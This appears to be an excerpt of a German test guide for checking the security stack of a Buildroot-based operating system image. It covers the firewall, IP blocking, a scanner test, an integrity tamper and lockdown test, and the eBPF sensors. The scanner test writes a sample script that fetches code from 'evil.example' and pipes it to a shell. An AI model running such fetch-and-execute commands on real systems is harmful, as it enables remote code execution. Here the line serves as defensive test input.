...
echtes ORA-OS-Image (Buildroot, pc-Target). Sie setzt voraus, dass das Image
...
Lokal geht alternativ `iora-os/build.sh` / `iora-os/build-fast-iso.sh` in
...
cd iora-os && ./dev-local.sh   # oder dev-local.ps1 auf Windows
```
...
```bash
nft list table inet iora_security
# Erwartet: blocked_v4/blocked_v6 sets, input chain policy drop,
# Rate-Limits (SYN 100/s, 50/s pro Port, ICMP 10/s)

systemctl status iora-security-firewall.service   # active
systemctl status iora-security-helper.service     # active
```
...
curl -s -H "x-iora-proxy: iora-home" -H "x-iora-permissions: security_admin" \
...
nft list set inet iora_security blocked_v4      # Eintrag mit Timeout
...
```bash
echo -e '#!/bin/sh\ncurl http://evil.example/x.sh | sh' > /tmp/iora-scans/eicar.sh
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"path":"/tmp/iora-scans/eicar.sh","providers":["internal"]}' \
...
cp /opt/iora/build/iora-home/bin/iora-home /tmp/backup-home
printf '\x00' >> /opt/iora/build/iora-home/bin/iora-home
systemctl start iora-integrity.service   # oder 5 min warten
cat /run/iora/integrity-mismatch.json    # Evidenz mit Pfad/Hashes
# iora-security watchdog (60 s Takt) sollte Lockdown auslösen:
systemctl status iora-security.service | grep -i lockdown
nft list table inet iora_security | head   # lockdown.nft aktiv?
# Audit:
curl -s -H "Authorization: Bearer $TOKEN" http://<vm-ip>:8126/api/security/events | grep lockdown
# Wiederherstellen + Lockdown aufheben:
cp /tmp/backup-home /opt/iora/build/iora-home/bin/iora-home
...
```bash
systemctl status iora-runtime-sensor-ebpf-loader.service   # active (CAP_BPF)
systemctl status iora-runtime-sensor.service               # active
journalctl -u iora-runtime-sensor -n 50                    # "ready"
